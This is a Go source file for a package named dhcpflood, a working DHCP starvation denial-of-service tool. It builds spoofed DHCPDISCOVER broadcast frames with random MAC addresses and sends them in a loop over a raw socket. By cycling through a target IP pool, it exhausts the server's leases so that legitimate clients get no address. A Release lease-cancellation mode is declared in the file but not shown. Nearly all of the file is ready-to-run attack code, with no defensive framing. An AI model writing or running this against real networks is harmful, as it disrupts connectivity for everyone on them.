// Package dhcpflood implements a DHCP pool exhaustion (starvation) attack.
//
// Each iteration the attack:
//   1. Generates a fresh random unicast source MAC.
//   2. Sets the DHCP chaddr field to that MAC (the server treats it as a new client).
//   3. Sends a DHCPDISCOVER broadcast with Option 50 (Requested IP Address) set to
//      the next IP in the user-specified pool range, cycling back to the start.
//
// The server reserves one IP per DISCOVER, exhausting the pool so legitimate
// clients cannot obtain an address.
//
// Frame: Ethernet II → IPv4 (src 0.0.0.0 → dst 255.255.255.255) → UDP 68→67 → DHCP.
package dhcpflood

import (
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"net"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"sync/atomic"
	"time"
)

const (
	dhcpFloodTag = "\x1b[35m[DHCP]\x1b[0m" // purple
)

// rawSocket is satisfied by the platform-specific AF_PACKET implementation.
type rawSocket interface {
	Send(frame []byte) error
	Recv(buf []byte) (int, error)
	SetReadTimeout(d time.Duration) error
	Close() error
}

// Flooder sends DHCP DoS packets on the given interface.
type Flooder struct {
	Interface string
	Pool      string // e.g. "192.168.100.2-254"
	Rate      int    // target pps; 0 = full hardware speed
	Discover  bool   // DISCOVER pool exhaustion
	Release   bool   // RELEASE lease cancellation
}

// Run opens a raw socket and runs the selected DHCP attack until Ctrl+C.
func (f *Flooder) Run() error {
	switch {
	case f.Discover:
		return f.runDiscover()
	case f.Release:
		return f.runRelease()
	default:
		return fmt.Errorf("no DHCP attack mode selected")
	}
}

// runDiscover sends DHCPDISCOVER packets with randomised source MACs, cycling
// through every IP in the given pool range.
func (f *Flooder) runDiscover() error {
	startIP, endIP, err := parsePool(f.Pool)
	if err != nil {
		return fmt.Errorf("invalid pool range: %w", err)
	}

	iface, err := net.InterfaceByName(f.Interface)
	if err != nil {
		return fmt.Errorf("interface %q: %w", f.Interface, err)
	}

	sock, err := openRawSocket(iface)
	if err != nil {
		return err
	}
	defer sock.Close()

	var total int64

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, os.Interrupt)
	go func() {
		<-sig
		fmt.Printf("\n%s Stopped. Total DISCOVERs sent: %d\n", dhcpFloodTag, atomic.LoadInt64(&total))
		os.Exit(0)
	}()

	go func() {
		t := time.NewTicker(time.Second)
		defer t.Stop()
		var prev int64
		for range t.C {
			cur := atomic.LoadInt64(&total)
			fmt.Printf("\r%s Total: %-12d  Rate: %-8d pps    ", dhcpFloodTag, cur, cur-prev)
			prev = cur
		}
	}()

	startDot := intToIP(startIP)
	endDot := intToIP(endIP)
	if f.Rate > 0 {
		fmt.Printf("%s Exhausting DHCP pool %s–%s on %s at %d pps — press Ctrl+C to stop.\n",
			dhcpFloodTag, startDot, endDot, f.Interface, f.Rate)
	} else {
		fmt.Printf("%s Exhausting DHCP pool %s–%s on %s at full speed — press Ctrl+C to stop.\n",
			dhcpFloodTag, startDot, endDot, f.Interface)
	}

	var interval time.Duration
	if f.Rate > 0 {
		interval = time.Second / time.Duration(f.Rate)
	}
	next := time.Now()
	cur := startIP

	for {
		if f.Rate > 0 {
			if now := time.Now(); now.Before(next) {
				time.Sleep(next.Sub(now))
			}
			next = next.Add(interval)
		}

		srcMAC := randMAC()
		_ = sock.Send(buildDiscover(srcMAC, cur))
		atomic.AddInt64(&total, 1)

		if cur >= endIP {
			cur = startIP
		} else {
			cur++
		}
	}
}

// parsePool parses "192.168.100.2-254" or "10.0.0.1-10.0.0.100".
// The end can be a bare last-octet (0-255) or a full IPv4 address.
func parsePool(s string) (start, end uint32, err error) {
	idx := strings.Index(s, "-")
	if idx < 0 {
		return 0, 0, fmt.Errorf("expected format A.B.C.D-E or A.B.C.D-A.B.C.E")
	}
	startStr := strings.TrimSpace(s[:idx])
	endStr := strings.TrimSpace(s[idx+1:])

	startIP := net.ParseIP(startStr)
	if startIP == nil {
		return 0, 0, fmt.Errorf("invalid start IP %q", startStr)
	}
	startIP = startIP.To4()
	if startIP == nil {
		return 0, 0, fmt.Errorf("start IP must be IPv4")
	}
	start = binary.BigEndian.Uint32(startIP)

	// Try as full IP, fall back to bare last-octet shorthand.
	endIP := net.ParseIP(endStr)
	if endIP != nil {
		endIP = endIP.To4()
		if endIP == nil {
			return 0, 0, fmt.Errorf("end IP must be IPv4")
		}
		end = binary.BigEndian.Uint32(endIP)
	} else {
		octet, e := strconv.Atoi(endStr)
		if e != nil || octet < 0 || octet > 255 {
			return 0, 0, fmt.Errorf("invalid end %q (expected IPv4 or octet 0-255)", endStr)
		}
		end = (start & 0xFFFFFF00) | uint32(octet)
	}

	if start > end {
		return 0, 0, fmt.Errorf("start IP must be ≤ end IP")
	}
	return start, end, nil
}

// buildDiscover assembles a complete Ethernet/IPv4/UDP/DHCPDISCOVER frame.
//
// Wire layout:
//
//	[0:6]   Ethernet dst  FF:FF:FF:FF:FF:FF (broadcast)
//	[6:12]  Ethernet src  random unicast MAC
//	[12:14] EtherType     0x0800 (IPv4)
//	[14:34] IPv4 header   src=0.0.0.0 dst=255.255.255.255 proto=UDP
//	[34:42] UDP header    sport=68 dport=67
//	[42:]   DHCP payload  BOOTREQUEST, chaddr=srcMAC, options: 53+50+end
func buildDiscover(srcMAC [6]byte, requestedIP uint32) []byte {
	// DHCP options: type 53 (DISCOVER) + type 50 (Requested IP) + end.
	opts := [10]byte{
		0x35, 0x01, 0x01, // Option 53: Message Type = DISCOVER
		0x32, 0x04,       // Option 50: Requested IP Address
		byte(requestedIP >> 24), byte(requestedIP >> 16),
		byte(requestedIP >> 8), byte(requestedIP),
		0xFF, // End
	}

	// DHCP fixed fields (236 bytes) + magic cookie (4) + options (10) = 250 bytes.
	dhcp := make([]byte, 250)
	dhcp[0] = 1 // op = BOOTREQUEST
	dhcp[1] = 1 // htype = Ethernet
	dhcp[2] = 6 // hlen = 6
	// dhcp[3] = hops = 0
	binary.BigEndian.PutUint32(dhcp[4:8], randU32())  // xid: random transaction ID
	// dhcp[8:10] = secs = 0
	binary.BigEndian.PutUint16(dhcp[10:12], 0x8000)  // flags: broadcast bit
	// ciaddr=yiaddr=siaddr=giaddr = 0.0.0.0 (already zero)
	copy(dhcp[28:34], srcMAC[:]) // chaddr (first 6 of 16-byte field)
	// sname[44:108] and file[108:236] are zero
	binary.BigEndian.PutUint32(dhcp[236:240], 0x63825363) // DHCP magic cookie
	copy(dhcp[240:250], opts[:])

	// UDP: sport=68 dport=67 + DHCP payload.
	udpLen := 8 + len(dhcp) // 8 + 250 = 258
	udp := make([]byte, udpLen)
	binary.BigEndian.PutUint16(udp[0:2], 68)             // source port (DHCP client)
	binary.BigEndian.PutUint16(udp[2:4], 67)             // dest port (DHCP server)
	binary.BigEndian.PutUint16(udp[4:6], uint16(udpLen)) // length
	// udp[6:8] = checksum, filled below
	copy(udp[8:], dhcp)
	var (
		srcIP = [4]byte{0, 0, 0, 0}
		dstIP = [4]byte{255, 255, 255, 255}
	)
	binary.BigEndian.PutUint16(udp[6:8], udpChecksum(srcIP, dstIP, udp))

	// IPv4 header (20 bytes).
	ipTotalLen := 20 + udpLen
	ipHdr := make([]byte, 20)
	ipHdr[0] = 0x45 // version=4, IHL=5
	binary.BigEndian.PutUint16(ipHdr[2:4], uint16(ipTotalLen))
	binary.BigEndian.PutUint16(ipHdr[4:6], randU16()) // identification
	// flags + frag offset = 0
	ipHdr[8] = 128 // TTL
	ipHdr[9] = 17  // protocol = UDP
	// ipHdr[10:12] = checksum, filled below; src = 0.0.0.0 (zero)
	copy(ipHdr[16:20], dstIP[:]) // dst = 255.255.255.255
	binary.BigEndian.PutUint16(ipHdr[10:12], ipChecksum(ipHdr))

	// Full Ethernet frame: 14 + 20 + 258 = 292 bytes.
	frame := make([]byte, 14+ipTotalLen)
	for i := 0; i < 6; i++ {
		frame[i] = 0xFF // dst = broadcast
	}
	copy(frame[6:12], srcMAC[:])
	binary.BigEndian.PutUint16(frame[12:14], 0x0800) // EtherType = IPv4
	copy(frame[14:34], ipHdr)
	copy(frame[34:], udp)

	return frame
}

// ipChecksum computes the RFC 791 one's complement checksum.
// The checksum field in hdr must be zero before calling.
func ipChecksum(hdr []byte) uint16 {
	var sum uint32
	for i := 0; i+1 < len(hdr); i += 2 {
		sum += uint32(binary.BigEndian.Uint16(hdr[i : i+2]))
	}
	if len(hdr)%2 == 1 {
		sum += uint32(hdr[len(hdr)-1]) << 8
	}
	for sum>>16 != 0 {
		sum = (sum & 0xffff) + (sum >> 16)
	}
	return ^uint16(sum)
}

// udpChecksum computes the UDP checksum via the IPv4 pseudo-header.
// The checksum field in udpSeg must be zero before calling.
func udpChecksum(srcIP, dstIP [4]byte, udpSeg []byte) uint16 {
	ph := make([]byte, 12+len(udpSeg))
	copy(ph[0:4], srcIP[:])
	copy(ph[4:8], dstIP[:])
	// ph[8] = 0 (zero byte)
	ph[9] = 17 // UDP protocol number
	binary.BigEndian.PutUint16(ph[10:12], uint16(len(udpSeg)))
	copy(ph[12:], udpSeg)
	return ipChecksum(ph)
}

// randMAC returns a random locally-administered unicast MAC (I/G bit = 0).
func randMAC() [6]byte {
	var m [6]byte
	rand.Read(m[:])
	m[0] = (m[0] & 0xFE) | 0x02
	return m
}

func randU16() uint16 {
	var b [2]byte
	rand.Read(b[:])
	return binary.BigEndian.Uint16(b[:])
}

func randU32() uint32 {
	var b [4]byte
	rand.Read(b[:])
	return binary.BigEndian.Uint32(b[:])
}

// intToIP converts a uint32 to dotted-decimal notation.
func intToIP(n uint32) string {
	return fmt.Sprintf("%d.%d.%d.%d", n>>24, (n>>16)&0xFF, (n>>8)&0xFF, n&0xFF)
}
